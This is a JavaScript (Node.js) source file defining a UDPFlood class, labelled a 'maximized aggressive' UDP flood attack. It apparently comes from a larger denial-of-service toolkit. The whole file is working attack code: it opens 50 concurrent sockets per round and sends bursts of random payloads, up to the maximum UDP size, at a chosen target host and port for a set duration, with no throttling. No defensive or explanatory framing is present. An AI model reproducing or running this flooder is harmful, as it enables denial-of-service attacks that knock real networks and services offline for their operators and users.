import dgram from 'dgram';
import { Tools } from '../../utils/tools.js';
import { logger } from '../../utils/logger.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';

/**
 * UDP Flood Attack - MAXIMIZED AGGRESSIVE VERSION
 */
export class UDPFlood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            // Launch 50 simultaneous UDP flood instances
            const floods = [];
            for (let i = 0; i < 50; i++) {
                floods.push(this.attack());
            }
            await Promise.allSettled(floods);
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const socket = dgram.createSocket('udp4');
            socket.setRecvBufferSize(65536);
            socket.setSendBufferSize(65536);
            
            let packetsSent = 0;
            const maxPackets = 10000; // 10k packets per instance

            const sendBurst = () => {
                if (!this.active || packetsSent >= maxPackets) {
                    Tools.safeClose(socket);
                    resolve();
                    return;
                }

                // Send 1000 packets per burst with varying sizes
                for (let i = 0; i < 1000; i++) {
                    if (!this.active) break;
                    
                    // Vary payload sizes for maximum impact
                    const payloadSize = Tools.randomInt(512, 65507); // Up to max UDP size
                    const payload = Tools.randomBytesBuffer(payloadSize);
                    
                    Tools.sendTo(socket, payload, this.port, this.target);
                    REQUESTS_SENT.add(1);
                    BYTES_SENT.add(payloadSize);
                    packetsSent++;
                }

                // Continue immediately without delay
                setImmediate(sendBurst);
            };

            sendBurst();

            // Auto cleanup after 3 seconds
            setTimeout(() => {
                Tools.safeClose(socket);
                resolve();
            }, 3000);
        });
    }

    stop() {
        this.active = false;
    }
}
